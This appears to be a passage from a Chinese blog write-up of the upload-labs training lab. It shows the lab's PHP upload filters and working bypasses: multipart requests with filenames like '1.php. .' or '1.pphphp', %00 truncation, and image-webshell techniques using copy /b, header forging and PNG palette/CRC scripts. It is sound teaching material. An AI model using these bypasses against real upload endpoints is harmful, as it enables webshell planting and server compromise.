class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>可以使用<code>1.php. .</code> 这个方式绕过</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php. .&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">30333176734664</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-23-13-35.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><strong>服务端-强黑名单检查-双写绕过</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>后端直接替换掉了关键字，而且是忽略大小的<br>使用双写绕过</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.pphphp&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">15141771128253</span>--</span><br></pre></td></tr></table></figure><p>访问</p><p><img src="/2022/02/28/upload-labs/2022-02-28-23-20-04.png"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>服务端-白名单检查-GET %00截断绕过</strong>   </p><p>%00截断利用需要有以下条件</p><blockquote><p>php版本小于5.3.4<br>php的magic_quotes_gpc为OFF状态   </p></blockquote><p>所以这使用PHP5.2.17<br>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload-labs/Pass-<span class="number">12</span>/index.php?save_path=../upload/<span class="number">1.</span>php%<span class="number">00</span> HTTP/<span class="number">1.1</span></span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">326623275720037</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>以及%00又是截断符，所以img_path变成了..&#x2F;upload&#x2F;1.php </p><p>然后因为使用的是<code>move_uploaded_file($temp_file,$img_path))</code>，所以把1.png放进了..&#x2F;upload&#x2F;1.php，成功绕过</p><p><img src="/2022/02/28/upload-labs/2022-02-28-23-38-11.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><strong>服务端-白名单检查-POST %00截断绕过</strong>    </p><p>原理同Pass-12，都是在拼接时检查不严，这里使用%00不行，POST不会把%00解析成0x00字节，所以直接用burp的hex修改。</p><p><img src="/2022/02/28/upload-labs/2022-03-01-08-57-48.png">   </p><p>POAT DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;save_path&quot;</span></span><br><span class="line"></span><br><span class="line">../upload/<span class="number">1.</span>php</span><br><span class="line">-----------------------------<span class="number">2995119424827</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">2995119424827</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">2995119424827</span>--</span><br></pre></td></tr></table></figure><p>访问得<br><img src="/2022/02/28/upload-labs/2022-03-01-08-59-09.png"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><strong>服务端-文件头检查-图片马绕过</strong><br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$bin</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//测试</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]); <span class="comment">//拼接两个字符的整数值 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//测试</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//测试</span></span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line">根据提示，设计一个图片马，然后包含即可</span><br><span class="line">![](./upload-labs/<span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span>-<span class="number">15</span>-<span class="number">51</span>-<span class="number">48</span>.png)</span><br><span class="line"></span><br><span class="line">上传之后，访问包含</span><br><span class="line"></span><br><span class="line">![](./upload-labs/<span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span>-<span class="number">15</span>-<span class="number">53</span>-<span class="number">56</span>.png)</span><br><span class="line"></span><br><span class="line">也可以使用 copy命令，例</span><br><span class="line">`copy 无标题.png/b + <span class="number">1</span>.Php test.png`，经测试 `/b`加不加都可以    </span><br><span class="line"></span><br><span class="line">上传即可</span><br><span class="line"></span><br><span class="line">![](./upload-labs/<span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span>-<span class="number">16</span>-<span class="number">07</span>-<span class="number">17</span>.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**补充知识：**</span><br><span class="line">```python</span><br><span class="line"></span><br><span class="line">COPY  [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ]  source  [/A | /B]  [+ source [/A | /B] [+ ...]]  [destination [/A | /B]]</span><br><span class="line"></span><br><span class="line">  source        指定要复制的文件。</span><br><span class="line">  /A            表示一个 ASCII 文本文件。</span><br><span class="line">  /B            表示一个二进位文件。</span><br><span class="line">  /D            允许解密要创建的目标文件</span><br><span class="line">  destination   为新文件指定目录和/或文件名。</span><br><span class="line">  /V            验证新文件写入是否正确。</span><br><span class="line">  /N            复制带有非 <span class="number">8</span>dot3 名称的文件时，尽可能使用短文件名。</span><br><span class="line">  /Y            不使用确认是否要覆盖现有目标文件的提示。</span><br><span class="line">  /-Y           使用确认是否要覆盖现有目标文件的提示。</span><br><span class="line">  /Z            用可重新启动模式复制已联网的文件。</span><br><span class="line">  /L            如果源是符号链接，请将链接复制到目标而不是源链接指向的实际文件。</span><br></pre></td></tr></table></figure><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>服务端-getimagesize检查-图片马绕过</strong></p><p>getimagesize — 取得图像大小</p><p>getimagesize(string $filename, array &amp;$imageinfo &#x3D; ?): array<br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height&#x2F;width 文本字符串。<br>如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。<br>返回一个具有四个单元的数组。索引 0 包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM。这些标记与 PHP 4.3.0 新加的 IMAGETYPE 常量对应。索引 3 是文本字符串，内容为“height&#x3D;”yyy” width&#x3D;”xxx””，可直接用于 IMG 标记。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);<span class="comment">//获取图片信息</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);<span class="comment">//提取图片类型</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;<span class="comment">//是否为符合白名单</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getimagesize源码本质也是查看文件头判断文件类型，所以Pass-14的方法仍然适用，上传图片马，PS 这里要是自己手动伪造的图片马，png为例，要把文件头改8个字节，也就是改成正常图片文件的前8个字节,如下</p><p><img src="/2022/02/28/upload-labs/2022-03-01-18-16-03.png"></p><p>访问</p><p><img src="/2022/02/28/upload-labs/2022-03-01-16-47-24.png"></p><p><strong>参考：</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#0x03-getimagesizeimagemagickpoc">imagemagick邂逅getimagesize的那点事儿</a><br><a href="https://www.php.net/manual/zh/function.getimagesize.php#refsect1-function.getimagesize-description">getimagesize</a></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><strong>服务端-exif_imagetype检查-图片马绕过</strong><br>exif_imagetype<br>exif_imagetype — 判断一个图像的类型<br>说明<br>exif_imagetype(string $filename): int<br>exif_imagetype() 读取一个图像的第一个字节并检查其签名。<br>本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER[‘HTTP_ACCEPT’] 结合使用来检查浏览器是否可以显示某个指定的图像。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">可能的返回值</span><br><span class="line"><span class="number">1</span>IMAGETYPE_GIF</span><br><span class="line"><span class="number">2</span>IMAGETYPE_JPEG</span><br><span class="line"><span class="number">3</span>IMAGETYPE_PNG</span><br><span class="line"><span class="number">4</span>IMAGETYPE_SWF</span><br><span class="line"><span class="number">5</span>IMAGETYPE_PSD</span><br><span class="line"><span class="number">6</span>IMAGETYPE_BMP</span><br><span class="line"><span class="number">7</span>IMAGETYPE_TIFF_II（Intel 字节顺序）</span><br><span class="line"><span class="number">8</span>IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><br><span class="line"><span class="number">9</span>IMAGETYPE_JPC</span><br><span class="line"><span class="number">10</span>IMAGETYPE_JP2</span><br><span class="line"><span class="number">11</span>IMAGETYPE_JPX</span><br><span class="line"><span class="number">12</span>IMAGETYPE_JB2</span><br><span class="line"><span class="number">13</span>IMAGETYPE_SWC</span><br><span class="line"><span class="number">14</span>IMAGETYPE_IFF</span><br><span class="line"><span class="number">15</span>IMAGETYPE_WBMP</span><br><span class="line"><span class="number">16</span>IMAGETYPE_XBM</span><br></pre></td></tr></table></figure><p>所以还是检查文件头以及文件结尾，前面的图片马还可以用，上传（狗头）</p><p><img src="/2022/02/28/upload-labs/2022-03-01-18-11-03.png"><br>然后发现这种和真实图片结合的方式老是报错，所以还传手动修改的，同Pass-16</p><p><img src="/2022/02/28/upload-labs/2022-03-01-18-16-24.png"></p><p>访问得到</p><p><img src="/2022/02/28/upload-labs/2022-03-01-18-16-47.png"></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><strong>服务端-imagecreatefrom检查-图片马绕过</strong><br>这里因为是imagecreatefrom*重写，所以就比较麻烦，因为gif被重写的数据较少，所以先从gif入手  </p><p>1、gif绕过<br>找一张gif，单面的gif，上传，然后下载，放进010editer对比<br>（这里我是在网上找了一张gif，上传后访问只有单面了，再上传这个单面的gif，再放发现几乎没有重写，也就是很方便写马。换句话说也可以在本地使用imagecreatefrom*重写以作准备）</p><p><img src="/2022/02/28/upload-labs/2022-03-02-07-58-21.png"></p><p>可以看到全部一样，可以在图上插入马</p><p>上传之后有报错（文件包含的时候，图片被当作文本，所以可能有报错。图片的问题，所以还要看一部份运气。）  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: Unexpected character <span class="keyword">in</span> <span class="built_in">input</span>: <span class="string">&#x27;&#x27;</span> (ASCII=<span class="number">27</span>) state=<span class="number">0</span> <span class="keyword">in</span> D:\phpstudy\PHPTutorial\WWW\upload\upload-labs\upload\<span class="number">7199.</span>gif on line <span class="number">5</span></span><br><span class="line"></span><br><span class="line">Parse error: syntax error, unexpected T_STRING <span class="keyword">in</span> D:\phpstudy\PHPTutorial\WWW\upload\upload-labs\upload\<span class="number">7199.</span>gif on line <span class="number">5</span></span><br></pre></td></tr></table></figure><p>把报错部分，也就是第5行删除，同时保证木马还在图片里，如下</p><p><img src="/2022/02/28/upload-labs/2022-03-02-08-06-09.png"></p><p>上传，利用</p><p><img src="/2022/02/28/upload-labs/2022-03-02-08-04-45.png"><br>2、png   </p><p>法1：<br>经测试，以及查阅资料，png格式图片只有索引图像也就是index-color的，才会有插马的空间，也就是PLTE后面的像素数据部分，而且还要考虑校验值等，相对麻烦一些。<br>一般图片不是index-color图片，所以我们想修改其为index-color图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">制作索引图</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randomPalette</span>(<span class="params">length, <span class="built_in">min</span>, <span class="built_in">max</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [randint(<span class="built_in">min</span>, <span class="built_in">max</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;test.png&#x27;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path).convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"><span class="comment"># img.show()</span></span><br><span class="line">i = randomPalette(<span class="number">90</span>, <span class="number">65</span>,<span class="number">122</span> )<span class="comment">#90是PLTE的长度，必须是三的倍数，这部分也是写入shell的空间。（65，122）是随机产生像素值的范围，选择了字母的ascii范围，避免包含出错，也可以自定这部分。</span></span><br><span class="line"><span class="built_in">print</span> (i)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(i))</span><br><span class="line">img.putpalette(i)</span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&#x27;test_01.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成之后，我们看一下大致的结构，蓝色是PLTE，是payload区域，紧接着是CRC校验，是我们插入payload之后要修改的，剩余为几个png文件头的标志。</p><p><img src="/2022/02/28/upload-labs/2022-03-03-08-29-54.png"></p><p>插入payload</p><p><img src="/2022/02/28/upload-labs/2022-03-03-08-35-09.png"></p><p>重新计算crc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">png = <span class="built_in">open</span>(<span class="string">r&#x27;bingbing_04.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; PLTE crc 